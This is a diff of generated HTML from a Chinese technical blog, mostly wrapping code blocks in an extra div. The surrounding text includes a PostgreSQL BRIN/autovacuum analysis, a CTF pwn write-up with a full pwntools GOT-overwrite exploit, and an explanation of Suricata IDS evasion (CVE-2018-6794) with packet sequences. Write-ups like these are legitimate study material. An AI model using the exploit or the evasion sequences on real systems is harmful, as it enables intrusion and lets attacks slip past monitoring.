  0xA8109CFA |       1 |          1024 |              1
 (1 row)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;lastrevmapage&lt;/code&gt; 表示 &lt;code class=&quot;highlighter-rouge&quot;&gt;revmap pages&lt;/code&gt; 最后一页的下标，即从 &lt;code class=&quot;highlighter-rouge&quot;&gt;meta page&lt;/code&gt; 的下一页到 &lt;code class=&quot;highlighter-rouge&quot;&gt;lastrevmapage&lt;/code&gt; 都是 &lt;code class=&quot;highlighter-rouge&quot;&gt;revmap pages&lt;/code&gt;。&lt;/p&gt;
 
@@ -803,7 +773,7 @@ p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1
 
 &lt;p&gt;接下来的 revmap 相当于一个目录，保存数据块到索引记录的映射关系，而且每一页 revmap 的记录数是固定的。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM brin_revmap_data(get_raw_page('idx', 1)) LIMIT 5;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM brin_revmap_data(get_raw_page('idx', 1)) LIMIT 5;
 
  pages
 -------
@@ -813,8 +783,7 @@ p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1
  (2,4)
  (2,5)
 (5 rows)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://github.com/postgres/postgres/blob/master/src/backend/access/brin/brin_revmap.c&quot;&gt;下面的宏&lt;/a&gt;可以计算出一个数据块在 revmap 中的位置，然后可以在 revmap 中查询到索引的位置。&lt;/p&gt;
 
@@ -832,7 +801,7 @@ p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1
 
 &lt;p&gt;可以通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;brin_page_items&lt;/code&gt; 查看索引记录&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM brin_page_items(get_raw_page('idx', 2), 'idx') LIMIT 5;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM brin_page_items(get_raw_page('idx', 2), 'idx') LIMIT 5;
 
  itemoffset | blknum | attnum | allnulls | hasnulls | placeholder |        value
 ------------+--------+--------+----------+----------+-------------+---------------------
@@ -842,8 +811,7 @@ p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1
           4 |   3072 |      1 | f        | f        | f           | {694273 .. 925696}
           5 |   4096 |      1 | f        | f        | f           | {925697 .. 1157120}
 (5 rows)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;blknum&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;attnum&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;allnulls&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;hasnulls&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;value&lt;/code&gt; 分别表示起始块数、字段下标、是否全为空值、是否存在空值和块范围内字段的最大最小值。这其中最重要的就是 value 这个字段了。PostgreSQL 就是根据这个 value 值来判断是否需要扫描这些数据块。以第三个条目为例，它的 &lt;code class=&quot;highlighter-rouge&quot;&gt;blknum&lt;/code&gt; 为 2048，说明是 2048 - 3072 数据块存储的数据范围是 &lt;code class=&quot;highlighter-rouge&quot;&gt;462849 .. 694272&lt;/code&gt;。如果我们查询的 SQL 是 &lt;code class=&quot;highlighter-rouge&quot;&gt;WHERE id = 492167&lt;/code&gt;，那在这些数据块中再搜索就足够了。&lt;/p&gt;
 
@@ -925,13 +893,12 @@ LWLockRelease(AutovacuumLock);
 
 &lt;p&gt;当请求队列已满且 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum_work&lt;/code&gt; 来不及处理时 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 就会失败。只要数据插入足够快，索引就跟不上我，所以即便是开启了 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt;，在大量数据被不断插入表中的情况下，请求队列会被迅速占满，导致 &lt;code class=&quot;highlighter-rouge&quot;&gt;autosummarize&lt;/code&gt; 失败，出现大量错误日志：&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;XXXX-XX-XX 09:39:55.832 UTC [67] LOG:  request for BRIN range summarization for index &quot;idx&quot; page 58311 was not recorded
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;XXXX-XX-XX 09:39:55.832 UTC [67] LOG:  request for BRIN range summarization for index &quot;idx&quot; page 58311 was not recorded
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;BRIN 索引需要定期被更新，否则就可能存在大量还未索引的记录，还有数据更新也导致一些索引条目失效或统计出现偏差。在 BRIN 索引不完整时过滤性能变差，无论查询的记录是否在已存在的索引条目中，在 Heap bitmap index scan 之后仍需要重新 Recheck 未统计的数据块，速度可能会变得非常缓慢，从原来的十几毫秒延长到几秒是有可能的，进而影响相关的业务系统。下面是一个比较极端的情况下的查询。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXPLAIN (analyze,buffers) SELECT * FROM example WHERE id &amp;gt; 100 AND id &amp;lt;= 2000;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXPLAIN (analyze,buffers) SELECT * FROM example WHERE id &amp;gt; 100 AND id &amp;lt;= 2000;
 
                                                        QUERY PLAN
 -------------------------------------------------------------------------------------------------------------------------
@@ -946,12 +913,11 @@ LWLockRelease(AutovacuumLock);
  Planning Time: 0.782 ms
  Execution Time: 6048.140 ms
 (10 rows)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;对比使用 Parallel Seq Scan 的查询：&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXPLAIN (analyze,buffers) SELECT * FROM example WHERE id &amp;gt; 100 AND id &amp;lt;= 2000;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXPLAIN (analyze,buffers) SELECT * FROM example WHERE id &amp;gt; 100 AND id &amp;lt;= 2000;
 
                                                           QUERY PLAN
 ------------------------------------------------------------------------------------------------------------------------------
@@ -966,20 +932,18 @@ LWLockRelease(AutovacuumLock);
  Planning Time: 0.659 ms
  Execution Time: 1646.008 ms
 (10 rows)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;autovacuum-为什么也没用&quot;&gt;autovacuum 为什么也没用&lt;/h3&gt;
 
 &lt;p&gt;上面一节提到了问题可能是 &lt;code class=&quot;highlighter-rouge&quot;&gt;AutoAacuumWork&lt;/code&gt; 队列已满，但是日常运行的 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 也应该可以实现相同的效果，为什么也没用呢。为了方便测试，我们可单独将表运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 的相关阈值调低，其他保持则默认值：&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ALTER TABLE example SET (autovacuum_vacuum_scale_factor = 0.0);
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ALTER TABLE example SET (autovacuum_vacuum_scale_factor = 0.0);
 ALTER TABLE example SET (autovacuum_vacuum_threshold = 100);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后根据我们的业务场景，不断在表中插入大量数据，然后观察 &lt;code class=&quot;highlighter-rouge&quot;&gt;pg_stat_user_tables&lt;/code&gt; 中记录：&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;safeline=# SELECT * FROM pg_stat_user_tables where relname = 'example';
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;safeline=# SELECT * FROM pg_stat_user_tables where relname = 'example';
 
 -[ RECORD 1 ]-------+------------------------------
 relid               | 32824
@@ -1004,8 +968,7 @@ vacuum_count        | 0
 autovacuum_count    | 0
 analyze_count       | 0
 autoanalyze_count   | 3
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;发现 &lt;code class=&quot;highlighter-rouge&quot;&gt;last_autovacuum&lt;/code&gt; 一直为空，而 &lt;code class=&quot;highlighter-rouge&quot;&gt;autoanalyze&lt;/code&gt; 能够预期地按照一定频率运行。原来在 &lt;code class=&quot;highlighter-rouge&quot;&gt;do_autovacuum&lt;/code&gt; 函数执行时，大致可分为 &lt;code class=&quot;highlighter-rouge&quot;&gt;dovacuum&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;doanalyze&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;doworkitems&lt;/code&gt; 等过程，而其中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;relation_needs_vacanalyze&lt;/code&gt; 函数将判断关系表是否需要做 &lt;code class=&quot;highlighter-rouge&quot;&gt;vacuum&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;analyze&lt;/code&gt;。在仅插入的场景下，表的 &lt;code class=&quot;highlighter-rouge&quot;&gt;n_dead_tup&lt;/code&gt; 很小（本例中没有行被更新或删除，&lt;code class=&quot;highlighter-rouge&quot;&gt;n_dead_tup&lt;/code&gt; 为 0），如果只调整 &lt;code class=&quot;highlighter-rouge&quot;&gt;autovacuum&lt;/code&gt; 的运行频率等配置，&lt;code class=&quot;highlighter-rouge&quot;&gt;dovacuum&lt;/code&gt; 也可能不会被触发。&lt;/p&gt;
 
@@ -1122,24 +1085,22 @@ read_line(&amp;amp;todos[idx*TODO_LENGTH], TODO_LENGTH);
 
 &lt;p&gt;使用 gdb 调试，&lt;code class=&quot;highlighter-rouge&quot;&gt;set follow-fork-mode parent&lt;/code&gt; 然后 &lt;code class=&quot;highlighter-rouge&quot;&gt;b main&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;p &amp;amp;todos&lt;/code&gt; 可以看到内存地址。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ p &amp;amp;todos
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ p &amp;amp;todos
 $1 = (&amp;lt;data variable, no debug info&amp;gt; *) 0x555555757140 &amp;lt;todos&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;在 IDA 中，也可以看到 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;got&lt;/code&gt; 表距离也非常近，写一个小程序算一下&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/790/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x203140&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x203140&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;结合 IDA 的结果和计算输出的结果，可以标记出来一些有用的数据&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x203140 -&amp;gt; todos
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x203140 -&amp;gt; todos
 0x203110
 0x2030e0
 0x2030b0
@@ -1150,12 +1111,11 @@ $1 = (&amp;lt;data variable, no debug info&amp;gt; *) 0x555555757140 &amp;lt;tod
 0x202ff0
 0x202fc0
 0x202f90
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;比如先读一下 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的地址&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-------------------------------------code-------------------------------------]
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-------------------------------------code-------------------------------------]
    0x555555554900 &amp;lt;puts@plt&amp;gt;:	jmp    QWORD PTR [rip+0x202712]        # 0x555555757018
    0x555555554906 &amp;lt;puts@plt+6&amp;gt;:	push   0x0
    0x55555555490b &amp;lt;puts@plt+11&amp;gt;:	jmp    0x5555555548f0
@@ -1170,26 +1130,24 @@ $1 = (&amp;lt;data variable, no debug info&amp;gt; *) 0x555555757140 &amp;lt;tod
        0x555555554926 &amp;lt;strlen@plt+6&amp;gt;:	push   0x2
                                                                   JUMP is taken
 [------------------------------------stack-------------------------------------]
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;重新画一下数据分布图&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x555555757140 -&amp;gt; todos
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x555555757140 -&amp;gt; todos
 0x555555757110
 0x5555557570e0
 0x5555557570b0
 0x555555757080
 0x555555757050
 0x555555757020 =&amp;gt; 0x555555554916 -&amp;gt; write@plt+6
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;由以前的知识就知道 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x555555757020&lt;/code&gt; 就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的 got 表的地址，减去刚才已知的 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 的位置，正好是 &lt;code class=&quot;highlighter-rouge&quot;&gt;(0x555555757020 - 0x555555757140) / 48 == -6&lt;/code&gt;。&lt;/p&gt;
 
 &lt;p&gt;可以先构造一个读取 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的 got 表地址 exp&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./todo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -1203,8 +1161,7 @@ $1 = (&amp;lt;data variable, no debug info&amp;gt; *) 0x555555757140 &amp;lt;tod
 &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;Q&lt;/code&gt; 是指定按照小端序读取 8 个字节作为一个数字。因为这时候 write 函数还没有被解析，所以 got 表中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 还是指向 &lt;code class=&quot;highlighter-rouge&quot;&gt;write@plt+6&lt;/code&gt; 的。&lt;/p&gt;
 
@@ -1212,7 +1169,7 @@ $1 = (&amp;lt;data variable, no debug info&amp;gt; *) 0x555555757140 &amp;lt;tod
 
 &lt;p&gt;完整 exp 如下&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./todo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -1234,8 +1191,7 @@ $1 = (&amp;lt;data variable, no debug info&amp;gt; *) 0x555555757140 &amp;lt;tod
 &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;参考&lt;/p&gt;
 
@@ -1247,7 +1203,7 @@ $1 = (&amp;lt;data variable, no debug info&amp;gt; *) 0x555555757140 &amp;lt;tod
 
 &lt;h2 id=&quot;cve-2018-6794&quot;&gt;CVE-2018-6794&lt;/h2&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 客户端开始三次握手 发送 SYN
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 客户端开始三次握手 发送 SYN
 Client    -&amp;gt;  [SYN] [Seq=0 Ack=0]           -&amp;gt;  Evil Server
 # 服务器端正常的响应了 SYN-ACK
 Client    &amp;lt;-  [SYN, ACK] [Seq=0 Ack=1]      &amp;lt;-  Evil Server
@@ -1259,8 +1215,7 @@ Client    &amp;lt;-  [FIN, ACK] [Seq=83 Ack=1]     &amp;lt;-  Evil Server
 Client    -&amp;gt;  [ACK] [Seq=1 Ack=84]          -&amp;gt;  Evil Server
 # 客户端正常的发送数据
 Client    -&amp;gt;  [PSH, ACK] [Seq=1 Ack= 4]     -&amp;gt;  Evil Server
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Suricata IDS 在 4.0.4 版本之前存在这个问题&lt;/p&gt;
 
@@ -1268,15 +1223,14 @@ Client    -&amp;gt;  [PSH, ACK] [Seq=1 Ack= 4]     -&amp;gt;  Evil Server
 
 &lt;p&gt;有些 Windows 客户端在收到 RST 包之后，如果紧接着又收到了其他的 TCP 数据，那仍然是可以读取和处理的，有些 IDS 正确处理了这个问题，有的在收到 RST 包之后就停止了检查 TCP 包。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Client starts a TCP 3-way handshake
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Client starts a TCP 3-way handshake
 Client    -&amp;gt;  [SYN] [Seq=0 Ack=0]           -&amp;gt;  Evil Server
 # Server responses with TCP RST
 Client    &amp;lt;-  [RST, ACK] [Seq=0x0 Ack=1]    &amp;lt;-  Evil Server
 # And SYN-ACK shortly after RST
 Client    &amp;lt;-  [SYN, ACK] [Seq=1 Ack=1]      &amp;lt;-  Evil Server
            ... 三次握手继续 ...
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Suricata IDS（全版本？）存在这个问题。对于 UDP 数据包，也有一个类似的问题。&lt;/p&gt;
 
 &lt;h2 id=&quot;应用&quot;&gt;应用&lt;/h2&gt;
@@ -1287,7 +1241,7 @@ Client    &amp;lt;-  [SYN, ACK] [Seq=1 Ack=1]      &amp;lt;-  Evil Server
 
 &lt;p&gt;写了一个 Python 的脚本来完成这个事情&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# coding=utf-8&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# coding=utf-8&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;
 
